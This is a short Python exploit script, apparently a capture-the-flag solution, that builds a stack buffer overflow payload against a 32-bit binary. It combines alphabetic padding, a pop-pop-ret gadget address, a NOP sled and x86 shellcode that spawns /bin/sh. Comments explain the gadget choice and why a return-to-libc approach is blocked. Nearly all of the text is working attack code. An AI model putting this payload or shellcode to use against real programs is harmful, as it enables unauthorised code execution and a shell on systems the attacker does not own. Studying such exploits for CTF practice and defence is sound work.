#!/usr/bin/python

#Tested on Ubuntu 16.04
'''
Return to text
pop pop ret
80485f7:	5b                   	pop    %ebx
 80485f8:	5d                   	pop    %ebp
 80485f9:	c3                   	ret 
 
 0804:0892 pop ebx<-- beginnning of pop pop Return
 Exploit because the return address cannot begin with 0xb. This means neither the stack nor the libc exploit will work
 
 Point to pop pop ret. The ret will have the address of the shellcode at the stack top. So (3rd argument, considering the first 2 arguments are popped)

#Exploit design, Assuming that we have executable permission on the stack
Intent 
|| buffer || ebp || ret address ||
|| padding       || address of 'pop pop ret' || garbage-1 || garbage-2 || ret address of shellcode || nopsled || shellcode 

Ebx will hold garbage1, and ebp will hold garbage2

'''
offset=80

#offset is calculated at 80, after supplying a payload of size 300 to the stack variable
#this challenge arranges the stack in a weird way 
#padding="A"*offset
padding=""


#Alphabetic sequence payload. 4A's 4B's.......(20 letters) 20x4=80 our offset
for i in range(20):
    padding+=chr(65+i)*4



shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"



nopsled="\x90"*100
#bffe:3070-middle of nop sled

##b7ee4c06 libc syscall 0xb7e3cdb

# address of pop pop ret, this will over flow the eip
ppraddr="\x92\x08\x04\x08"


g1="\x41\x41\x41\x41"
g2="\x42\x42\x42\x42"

retSh= "CCCC"

nopsled = "\x90"*100
exploit=padding+ppraddr+g1+g2+retSh+nopsled+shellcode

print exploit